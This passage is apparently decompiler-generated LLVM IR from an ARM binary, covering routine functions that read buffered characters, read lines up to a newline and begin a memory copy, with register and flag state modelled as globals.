  uselistorder i32* @r8, { 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 143, 144, 3, 145, 146, 147, 157, 158, 159, 160, 161, 10, 162, 163, 164, 165, 166, 167, 168, 169, 70, 71, 72, 73, 74, 21, 22, 23, 24, 25, 26, 27, 28, 42, 44, 45, 33, 35, 4, 29, 30, 31, 32, 34, 43, 36, 37, 38, 39, 40, 41, 46, 47, 148, 149, 150, 151, 5, 59, 0, 60, 61, 62, 11, 63, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 64, 65, 68, 66, 67, 9, 69, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 6, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 8, 130, 131, 132, 133, 134, 135, 1, 136, 137, 138, 139, 140, 141, 142, 152, 153, 154, 155, 156, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 7, 190, 191, 192, 193 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11 }
  uselistorder i32 72, { 0, 1, 2, 3, 4, 5, 15, 11, 12, 13, 14, 6, 16, 7, 8, 9, 10 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_174b0, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17428, { 1, 0 }
  uselistorder label %dec_label_pc_1735c, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_1750c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1750c:
  %v0_1750c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1750c, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_1750c
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1750c, %bb
  %v5_17528 = phi i32 [ %arg1, %dec_label_pc_1750c ], [ 0, %bb ]
  ret i32 %v5_17528

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_1752c(i16* %arg1) local_unnamed_addr {
dec_label_pc_1752c:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_1752c = load i32, i32* @r4, align 4
  store i32 %v3_1752c, i32* %stack_var_-12, align 4
  %v6_1752c = load i32, i32* @r5, align 4
  %v9_1752c = load i32, i32* @lr, align 4
  %v0_17530 = load i32, i32* @r0, align 4
  %v1_17530 = add i32 %v0_17530, 16
  %v2_17530 = inttoptr i32 %v1_17530 to i32*
  %v3_17530 = load i32, i32* %v2_17530, align 4
  store i32 %v3_17530, i32* %r2.global-to-local, align 4
  %v1_17534 = add i32 %v0_17530, 24
  %v2_17534 = inttoptr i32 %v1_17534 to i32*
  %v3_17534 = load i32, i32* %v2_17534, align 4
  %v3_17538 = icmp ult i32 %v3_17530, %v3_17534
  store i32 %v0_17530, i32* @r4, align 4
  br i1 %v3_17538, label %bb, label %dec_label_pc_17558

bb:                                               ; preds = %dec_label_pc_1752c
  %v2_17544 = inttoptr i32 %v3_17530 to i8*
  %v3_17544 = load i8, i8* %v2_17544, align 1
  %v4_17544 = zext i8 %v3_17544 to i32
  store i32 %v4_17544, i32* %r0.global-to-local, align 4
  %v6_17544 = add i32 %v3_17530, 1
  store i32 %v6_17544, i32* %r2.global-to-local, align 4
  store i32 %v6_17544, i32* %v2_17530, align 4
  br label %dec_label_pc_17644

dec_label_pc_17558:                               ; preds = %dec_label_pc_1752c
  store i32 135344, i32* @r5, align 4
  %v1_17558 = inttoptr i32 %v0_17530 to i16*
  %v2_17558 = load i16, i16* %v1_17558, align 2
  %v3_17558 = zext i16 %v2_17558 to i32
  %v1_1755c = and i32 %v3_17558, 131
  %tmp24 = icmp ugt i32 %v1_1755c, 128
  br i1 %tmp24, label %dec_label_pc_17578, label %dec_label_pc_17568

dec_label_pc_17568:                               ; preds = %dec_label_pc_17558
  store i32 128, i32* @r1, align 4
  %v0_1756c = call i32 @function_1839c()
  store i32 %v0_1756c, i32* %r0.global-to-local, align 4
  %v2_17570 = icmp eq i32 %v0_1756c, 0
  br i1 %v2_17570, label %dec_label_pc_17568.dec_label_pc_17578_crit_edge, label %dec_label_pc_17640

dec_label_pc_17568.dec_label_pc_17578_crit_edge:  ; preds = %dec_label_pc_17568
  %v0_17578.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17578

dec_label_pc_17578:                               ; preds = %dec_label_pc_17568.dec_label_pc_17578_crit_edge, %dec_label_pc_17558
  %v2_175b8 = phi i32 [ %v0_17578.pre, %dec_label_pc_17568.dec_label_pc_17578_crit_edge ], [ %v0_17530, %dec_label_pc_17558 ]
  %v1_17578 = inttoptr i32 %v2_175b8 to i16*
  %v2_17578 = load i16, i16* %v1_17578, align 2
  %v3_17578 = zext i16 %v2_17578 to i32
  store i32 %v3_17578, i32* %r2.global-to-local, align 4
  %v1_1757c = and i32 %v3_17578, 2
  %v2_1757c = icmp eq i32 %v1_1757c, 0
  br i1 %v2_1757c, label %dec_label_pc_175a8, label %dec_label_pc_17584

dec_label_pc_17584:                               ; preds = %dec_label_pc_17578
  %tmp25 = urem i16 %v2_17578, 2
  %v1_17584 = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_17584
  %v4_17588 = and i32 %tmp21, 4
  %v5_17588 = add i32 %v4_17588, %v2_175b8
  %v1_1758c = add i32 %v5_17588, 36
  %v2_1758c = inttoptr i32 %v1_1758c to i8*
  %v3_1758c = load i8, i8* %v2_1758c, align 1
  %v4_1758c = zext i8 %v3_1758c to i32
  %v1_17590 = add nsw i32 %v3_17578, -1
  store i32 %v1_17590, i32* %r2.global-to-local, align 4
  store i32 %v4_1758c, i32* %r0.global-to-local, align 4
  %v2_1759c = add i32 %v2_175b8, 40
  %v3_1759c = inttoptr i32 %v2_1759c to i32*
  store i32 0, i32* %v3_1759c, align 4
  %v0_175a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_175a0 = trunc i32 %v0_175a0 to i16
  %v2_175a0 = load i32, i32* @r4, align 4
  %v3_175a0 = inttoptr i32 %v2_175a0 to i16*
  store i16 %v1_175a0, i16* %v3_175a0, align 2
  br label %dec_label_pc_17644

dec_label_pc_175a8:                               ; preds = %dec_label_pc_17578
  %v1_175a8 = add i32 %v2_175b8, 16
  %v1_175ac = inttoptr i32 %v1_175a8 to i32*
  %v2_175ac = load i32, i32* %v1_175ac, align 4
  %v3_175ac = add i32 %v2_175b8, 20
  %v4_175ac = inttoptr i32 %v3_175ac to i32*
  %v5_175ac = load i32, i32* %v4_175ac, align 4
  %v9_175b0 = icmp eq i32 %v5_175ac, %v2_175ac
  br i1 %v9_175b0, label %dec_label_pc_175c0, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_175a8
  %v2_175b4 = inttoptr i32 %v2_175ac to i8*
  %v3_175b4 = load i8, i8* %v2_175b4, align 1
  %v4_175b4 = zext i8 %v3_175b4 to i32
  store i32 %v4_175b4, i32* %r0.global-to-local, align 4
  %v6_175b4 = add i32 %v2_175ac, 1
  store i32 %v6_175b4, i32* %v1_175ac, align 4
  br label %dec_label_pc_17644

dec_label_pc_175c0:                               ; preds = %dec_label_pc_175a8
  %v1_175c0 = add i32 %v2_175b8, 4
  %v2_175c0 = inttoptr i32 %v1_175c0 to i32*
  %v3_175c0 = load i32, i32* %v2_175c0, align 4
  %v7_175c4 = icmp eq i32 %v3_175c0, -2
  br i1 %v7_175c4, label %.thread8, label %dec_label_pc_175d8

.thread8:                                         ; preds = %dec_label_pc_175c0
  %v2_175c8 = or i16 %v2_17578, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_175c8, i16* %v1_17578, align 2
  br label %dec_label_pc_17644

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175c0
  %v1_175d8 = and i32 %v3_17578, 768
  %v2_175d8 = icmp eq i32 %v1_175d8, 0
  br i1 %v2_175d8, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_175d8
  %v1_175e0 = load i32, i32* @r5, align 4
  %v3_175e0 = add i32 %v1_175e0, 44
  %v4_175e0 = inttoptr i32 %v3_175e0 to i32*
  %v5_175e0 = load i32, i32* %v4_175e0, align 4
  store i32 %v5_175e0, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_175d8, %bb22
  %v1_175e4 = xor i1 %v2_175d8, true
  call void @__pseudo_cond_branch(i1 %v1_175e4, i32 ptrtoint (i32* @global_var_17320.686 to i32))
  %v0_175e8 = load i32, i32* @r4, align 4
  %v1_175e8 = add i32 %v0_175e8, 8
  store i32 %v1_175e8, i32* %r2.global-to-local, align 4
  %v1_175ec = inttoptr i32 %v1_175e8 to i32*
  %v2_175ec = load i32, i32* %v1_175ec, align 4
  store i32 %v2_175ec, i32* %r2.global-to-local, align 4
  %v3_175ec = add i32 %v0_175e8, 12
  %v4_175ec = inttoptr i32 %v3_175ec to i32*
  %v5_175ec = load i32, i32* %v4_175ec, align 4
  %v9_175f0 = icmp eq i32 %v5_175ec, %v2_175ec
  br i1 %v9_175f0, label %dec_label_pc_17624, label %dec_label_pc_175f8

dec_label_pc_175f8:                               ; preds = %.thread10
  %v2_175f8 = add i32 %v0_175e8, 24
  %v3_175f8 = inttoptr i32 %v2_175f8 to i32*
  store i32 %v2_175ec, i32* %v3_175f8, align 4
  %v0_175fc = load i32, i32* @r4, align 4
  store i32 %v0_175fc, i32* %r0.global-to-local, align 4
  %v2_17600 = call i32 @function_1836c(i32 %v0_175fc)
  store i32 %v2_17600, i32* %r0.global-to-local, align 4
  %v2_17604 = icmp eq i32 %v2_17600, 0
  br i1 %v2_17604, label %dec_label_pc_17640, label %dec_label_pc_1760c

dec_label_pc_1760c:                               ; preds = %dec_label_pc_175f8
  %v0_1760c = load i32, i32* @r4, align 4
  %v1_1760c = add i32 %v0_1760c, 20
  %v2_1760c = inttoptr i32 %v1_1760c to i32*
  %v3_1760c = load i32, i32* %v2_1760c, align 4
  %v2_17610 = add i32 %v0_1760c, 24
  %v3_17610 = inttoptr i32 %v2_17610 to i32*
  store i32 %v3_1760c, i32* %v3_17610, align 4
  %v0_17614 = load i32, i32* @r4, align 4
  %v1_17614 = add i32 %v0_17614, 16
  %v2_17614 = inttoptr i32 %v1_17614 to i32*
  %v3_17614 = load i32, i32* %v2_17614, align 4
  %v1_17618 = inttoptr i32 %v3_17614 to i8*
  %v2_17618 = load i8, i8* %v1_17618, align 1
  %v3_17618 = zext i8 %v2_17618 to i32
  store i32 %v3_17618, i32* %r0.global-to-local, align 4
  %v5_17618 = add i32 %v3_17614, 1
  store i32 %v5_17618, i32* %v2_17614, align 4
  br label %dec_label_pc_17644

dec_label_pc_17624:                               ; preds = %.thread10
  %v1_17624 = inttoptr i32 %v0_175e8 to i16*
  store i32 %v0_175e8, i32* %r0.global-to-local, align 4
  %v2_17628 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_17630 = call i32 @function_18260(i16* %v1_17624, i32 %v2_17628, i32 1)
  store i32 %v5_17630, i32* %r0.global-to-local, align 4
  %v2_17634 = icmp eq i32 %v5_17630, 0
  br i1 %v2_17634, label %dec_label_pc_17640, label %bb23

bb23:                                             ; preds = %dec_label_pc_17624
  %v4_17638 = load i8, i8* %stack_var_-17, align 1
  %v5_17638 = sext i8 %v4_17638 to i32
  store i32 %v5_17638, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17644

dec_label_pc_17640:                               ; preds = %dec_label_pc_17624, %dec_label_pc_17568, %dec_label_pc_175f8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17644

dec_label_pc_17644:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_1760c, %dec_label_pc_17584, %dec_label_pc_17640
  %v2_17648 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17648, i32* @r4, align 4
  store i32 %v6_1752c, i32* @r5, align 4
  store i32 %v9_1752c, i32* @lr, align 4
  %v1_1764c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1764c

; uselistorder directives
  uselistorder i32 %v2_175ac, { 1, 0, 2 }
  uselistorder i32 %v2_175b8, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_17530, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17530, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 1, 0, 4, 3, 2, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder i32 768, { 1, 0, 2 }
  uselistorder i32 128, { 19, 0, 15, 14, 9, 23, 1, 24, 25, 10, 26, 20, 16, 11, 12, 21, 22, 17, 13, 3, 4, 5, 6, 7, 8, 27, 2, 28, 18 }
  uselistorder label %dec_label_pc_17644, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_17640, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_17658(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17658:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_17658 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1765c = icmp eq i32 %arg2, 0
  store i1 %v2_1765c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_176e4, label %dec_label_pc_176cc.preheader

dec_label_pc_176cc.preheader:                     ; preds = %dec_label_pc_17658
  store i32 %tmp, i32* @r5, align 4
  %v1_176cc2 = add i32 %arg2, -1
  store i32 %v1_176cc2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_176cc8 = icmp eq i32 %arg2, 1
  store i1 %v7_176cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_176cc8, label %dec_label_pc_176d4, label %dec_label_pc_17678

dec_label_pc_17678:                               ; preds = %dec_label_pc_176cc.preheader, %dec_label_pc_176cc.backedge.dec_label_pc_17678_crit_edge
  %v0_1769c = phi i32 [ %v0_17678.pre, %dec_label_pc_176cc.backedge.dec_label_pc_17678_crit_edge ], [ %arg3, %dec_label_pc_176cc.preheader ]
  %v1_17678 = add i32 %v0_1769c, 16
  %v2_17678 = inttoptr i32 %v1_17678 to i32*
  %v3_17678 = load i32, i32* %v2_17678, align 4
  store i32 %v3_17678, i32* %r2.global-to-local, align 4
  %v1_1767c = add i32 %v0_1769c, 24
  %v2_1767c = inttoptr i32 %v1_1767c to i32*
  %v3_1767c = load i32, i32* %v2_1767c, align 4
  store i32 %v3_1767c, i32* %r3.global-to-local, align 4
  %v3_17680 = icmp uge i32 %v3_17678, %v3_1767c
  store i1 %v3_17680, i1* %cpsr_c.global-to-local, align 1
  %v9_17680 = icmp eq i32 %v3_17678, %v3_1767c
  store i1 %v9_17680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17680, label %dec_label_pc_1769c, label %dec_label_pc_17688

dec_label_pc_17688:                               ; preds = %dec_label_pc_17678
  %v1_17688 = inttoptr i32 %v3_17678 to i8*
  %v2_17688 = load i8, i8* %v1_17688, align 1
  %v3_17688 = zext i8 %v2_17688 to i32
  store i32 %v3_17688, i32* %r3.global-to-local, align 4
  %v5_17688 = add i32 %v3_17678, 1
  store i32 %v5_17688, i32* %r2.global-to-local, align 4
  %v2_1768c = load i32, i32* @r5, align 4
  %v3_1768c = inttoptr i32 %v2_1768c to i8*
  store i8 %v2_17688, i8* %v3_1768c, align 1
  %v4_1768c = load i32, i32* @r5, align 4
  %v5_1768c = add i32 %v4_1768c, 1
  store i32 %v5_1768c, i32* @r5, align 4
  %v0_17690 = load i32, i32* %r3.global-to-local, align 4
  %v2_17690 = icmp ugt i32 %v0_17690, 9
  store i1 %v2_17690, i1* %cpsr_c.global-to-local, align 1
  %v7_17690 = icmp eq i32 %v0_17690, 10
  store i1 %v7_17690, i1* %cpsr_z.global-to-local, align 1
  %v0_17694 = load i32, i32* %r2.global-to-local, align 4
  %v1_17694 = load i32, i32* @r4, align 4
  %v2_17694 = add i32 %v1_17694, 16
  %v3_17694 = inttoptr i32 %v2_17694 to i32*
  store i32 %v0_17694, i32* %v3_17694, align 4
  br i1 %v7_17690, label %dec_label_pc_176d4, label %dec_label_pc_176cc.backedge

dec_label_pc_1769c:                               ; preds = %dec_label_pc_17678
  %v1_1769c = inttoptr i32 %v0_1769c to i16*
  %v3_176a0 = call i32 @function_1752c(i16* %v1_1769c)
  %v3_176a4 = icmp eq i32 %v3_176a0, -1
  store i1 %v3_176a4, i1* %cpsr_c.global-to-local, align 1
  %v8_176a4 = icmp eq i32 %v3_176a0, -1
  store i1 %v8_176a4, i1* %cpsr_z.global-to-local, align 1
  %v1_176a8 = urem i32 %v3_176a0, 256
  store i32 %v1_176a8, i32* %r3.global-to-local, align 4
  br i1 %v3_176a4, label %dec_label_pc_176b0, label %dec_label_pc_176c8

dec_label_pc_176b0:                               ; preds = %dec_label_pc_1769c
  %v0_176b0 = load i32, i32* @r4, align 4
  %v1_176b0 = inttoptr i32 %v0_176b0 to i16*
  %v2_176b0 = load i16, i16* %v1_176b0, align 2
  %v3_176b0 = zext i16 %v2_176b0 to i32
  store i32 %v3_176b0, i32* %r3.global-to-local, align 4
  %v1_176b4 = and i32 %v3_176b0, 8
  %v2_176b4 = icmp eq i32 %v1_176b4, 0
  store i1 %v2_176b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_176b4, label %dec_label_pc_176d4, label %dec_label_pc_176e4

dec_label_pc_176c8:                               ; preds = %dec_label_pc_1769c
  %v1_176c0 = trunc i32 %v3_176a0 to i8
  %v2_176c0 = load i32, i32* @r5, align 4
  %v3_176c0 = inttoptr i32 %v2_176c0 to i8*
  store i8 %v1_176c0, i8* %v3_176c0, align 1
  %v4_176c0 = load i32, i32* @r5, align 4
  %v5_176c0 = add i32 %v4_176c0, 1
  store i32 %v5_176c0, i32* @r5, align 4
  %v0_176c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_176c4 = icmp ugt i32 %v0_176c4, 9
  store i1 %v2_176c4, i1* %cpsr_c.global-to-local, align 1
  %v7_176c4 = icmp eq i32 %v0_176c4, 10
  store i1 %v7_176c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_176c4, label %dec_label_pc_176d4, label %dec_label_pc_176cc.backedge

dec_label_pc_176cc.backedge:                      ; preds = %dec_label_pc_176c8, %dec_label_pc_17688
  %v0_176cc = load i32, i32* %r6.global-to-local, align 4
  %v1_176cc = add i32 %v0_176cc, -1
  store i32 %v1_176cc, i32* %r6.global-to-local, align 4
  %v2_176cc = icmp ne i32 %v0_176cc, 0
  store i1 %v2_176cc, i1* %cpsr_c.global-to-local, align 1
  %v7_176cc = icmp eq i32 %v0_176cc, 1
  store i1 %v7_176cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_176cc, label %dec_label_pc_176d4, label %dec_label_pc_176cc.backedge.dec_label_pc_17678_crit_edge

dec_label_pc_176cc.backedge.dec_label_pc_17678_crit_edge: ; preds = %dec_label_pc_176cc.backedge
  %v0_17678.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17678

dec_label_pc_176d4:                               ; preds = %dec_label_pc_176c8, %dec_label_pc_176cc.backedge, %dec_label_pc_17688, %dec_label_pc_176cc.preheader, %dec_label_pc_176b0
  %v0_176d4 = load i32, i32* @r5, align 4
  %v1_176d4 = load i32, i32* @r7, align 4
  %v3_176d4 = icmp uge i32 %v0_176d4, %v1_176d4
  store i1 %v3_176d4, i1* %cpsr_c.global-to-local, align 1
  %v9_176d4 = icmp eq i32 %v0_176d4, %v1_176d4
  store i1 %v9_176d4, i1* %cpsr_z.global-to-local, align 1
  %v2_176d8 = xor i1 %v9_176d4, true
  %v3_176d8 = and i1 %v3_176d4, %v2_176d8
  br i1 %v3_176d8, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_176d4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_176dc = inttoptr i32 %v0_176d4 to i8*
  store i8 0, i8* %v7_176dc, align 1
  %v0_176e0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_176e0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_176d4, %bb
  %v1_176e0 = phi i1 [ %v1_176e0.pre, %bb ], [ %v9_176d4, %dec_label_pc_176d4 ]
  %v0_176e0 = phi i1 [ %v0_176e0.pre, %bb ], [ %v3_176d4, %dec_label_pc_176d4 ]
  %v2_176e0 = xor i1 %v1_176e0, true
  %v3_176e0 = and i1 %v0_176e0, %v2_176e0
  br i1 %v3_176e0, label %.dec_label_pc_176e8_crit_edge, label %dec_label_pc_176e4

.dec_label_pc_176e8_crit_edge:                    ; preds = %.thread14
  %v0_176e8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_176e8

dec_label_pc_176e4:                               ; preds = %dec_label_pc_17658, %dec_label_pc_176b0, %.thread14
  br label %dec_label_pc_176e8

dec_label_pc_176e8:                               ; preds = %.dec_label_pc_176e8_crit_edge, %dec_label_pc_176e4
  %v0_176e8 = phi i32 [ %v0_176e8.pre, %.dec_label_pc_176e8_crit_edge ], [ 0, %dec_label_pc_176e4 ]
  store i32 %v6_17658, i32* @r5, align 4
  ret i32 %v0_176e8

; uselistorder directives
  uselistorder i1 %v9_176d4, { 1, 0, 2 }
  uselistorder i32 %v1_176d4, { 1, 0 }
  uselistorder i32 %v0_176d4, { 0, 2, 1 }
  uselistorder i32 %v0_176cc, { 2, 0, 1 }
  uselistorder i32 %v0_176c4, { 1, 0 }
  uselistorder i32 %v3_176a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_17690, { 1, 0 }
  uselistorder i32 %v3_17678, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1769c, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i1 true, { 0, 1, 79, 108, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 76, 31, 32, 33, 34, 35, 84, 83, 36, 109, 110, 99, 111, 112, 39, 113, 40, 41, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 37, 38, 124, 125, 126, 74, 77, 98, 97, 52, 53, 54, 127, 55, 56, 85, 86, 92, 87, 93, 81, 91, 128, 82, 96, 129, 42, 130, 43, 44, 45, 131, 100, 101, 46, 47, 132, 102, 103, 48, 49, 133, 104, 105, 50, 51, 80, 134, 135, 94, 136, 57, 88, 58, 59, 78, 60, 61, 62, 63, 64, 137, 138, 139, 140, 89, 141, 142, 143, 144, 145, 146, 147, 69, 70, 148, 71, 72, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 68, 164, 165, 166, 167, 168, 169, 67, 170, 75, 90, 95, 73, 171, 65, 66, 107, 172, 106 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_176e8, { 1, 0 }
  uselistorder label %dec_label_pc_176e4, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_176d4, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_17678, { 1, 0 }
}

define i32 @function_176f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_176f8:
  ret i32 %arg1
}

define i32 @function_17700() local_unnamed_addr {
dec_label_pc_17700:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_17700 = load i32, i32* @r1, align 4
  %v1_17700 = load i32, i32* @r0, align 4
  %v2_17700 = sub i32 %v0_17700, %v1_17700
  %v3_17700 = icmp ult i32 %v0_17700, %v1_17700
  %v4_17700 = xor i32 %v1_17700, %v0_17700
  %v5_17700 = xor i32 %v2_17700, %v0_17700
  %v6_17700 = and i32 %v5_17700, %v4_17700
  %v7_17700 = icmp slt i32 %v6_17700, 0
  store i1 %v7_17700, i1* %cpsr_v.global-to-local, align 1
  %v8_17700 = icmp slt i32 %v2_17700, 0
  store i1 %v8_17700, i1* %cpsr_n.global-to-local, align 1
  %v9_17700 = icmp eq i32 %v0_17700, %v1_17700
  store i1 %v9_17700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17700, label %dec_label_pc_17954, label %dec_label_pc_17708

dec_label_pc_17708:                               ; preds = %dec_label_pc_17700
  br i1 %v9_17700, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_17708
  %merge = phi i32 [ %v0_17700, %dec_label_pc_17708 ], [ %v2_179e8, %bb150 ], [ %v11_17a04, %bb153 ], [ %v7_17a04, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_17708
  %v5_1770c = inttoptr i32 %v1_17700 to i8*
  store i8* %v5_1770c, i8** %stack_var_-8, align 4
  %v8_1770c = load i32, i32* @lr, align 4
  %v0_17710 = load i32, i32* @r2, align 4
  %v2_17710 = add i32 %v0_17710, -4
  store i32 %v2_17710, i32* %r2.global-to-local, align 4
  %v4_17710 = sub i32 3, %v0_17710
  %v5_17710 = and i32 %v4_17710, %v0_17710
  %v6_17710 = icmp slt i32 %v5_17710, 0
  store i1 %v6_17710, i1* %cpsr_v.global-to-local, align 1
  %v7_17710 = icmp slt i32 %v2_17710, 0
  store i1 %v7_17710, i1* %cpsr_n.global-to-local, align 1
  %v8_17710 = icmp eq i32 %v0_17710, 4
  store i1 %v8_17710, i1* %cpsr_z.global-to-local, align 1
  %v5_17714 = icmp slt i32 %v0_17710, 4
  br i1 %v5_17714, label %bb140, label %dec_label_pc_17718

dec_label_pc_17718:                               ; preds = %bb
  %v1_17718 = urem i32 %v1_17700, 4
  store i32 %v1_17718, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17718 = icmp eq i32 %v1_17718, 0
  store i1 %v2_17718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17718, label %dec_label_pc_17720, label %dec_label_pc_177cc

dec_label_pc_17720:                               ; preds = %dec_label_pc_17718
  %v1_17720 = urem i32 %v0_17700, 4
  store i32 %v1_17720, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17720 = icmp eq i32 %v1_17720, 0
  store i1 %v2_17720, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_17700 to i2
  br i1 %v2_17720, label %dec_label_pc_17728, label %dec_label_pc_177fc

dec_label_pc_17728:                               ; preds = %dec_label_pc_17720, %dec_label_pc_177f4
  %v0_1774094 = phi i32 [ %v1_17700, %dec_label_pc_17720 ], [ %v0_1791c77, %dec_label_pc_177f4 ]
  %v0_1773c93 = phi i32 [ %v0_17700, %dec_label_pc_17720 ], [ %v0_177f4, %dec_label_pc_177f4 ]
  %v0_17728 = phi i32 [ %v2_17710, %dec_label_pc_17720 ], [ %v2_177ec, %dec_label_pc_177f4 ]
  %v1_17728 = add i32 %v0_17728, -8
  store i32 %v1_17728, i32* %r2.global-to-local, align 4
  %v3_17728 = sub i32 7, %v0_17728
  %v4_17728 = and i32 %v3_17728, %v0_17728
  %v5_17728 = icmp slt i32 %v4_17728, 0
  store i1 %v5_17728, i1* %cpsr_v.global-to-local, align 1
  %v6_17728 = icmp slt i32 %v1_17728, 0
  store i1 %v6_17728, i1* %cpsr_n.global-to-local, align 1
  %v7_17728 = icmp eq i32 %v0_17728, 8
  store i1 %v7_17728, i1* %cpsr_z.global-to-local, align 1
  %v2_1772c = xor i1 %v6_17728, %v5_17728
  br i1 %v2_1772c, label %dec_label_pc_1777c, label %dec_label_pc_17730

dec_label_pc_17730:                               ; preds = %dec_label_pc_17728
  %v1_17730 = add i32 %v0_17728, -28
  store i32 %v1_17730, i32* %r2.global-to-local, align 4
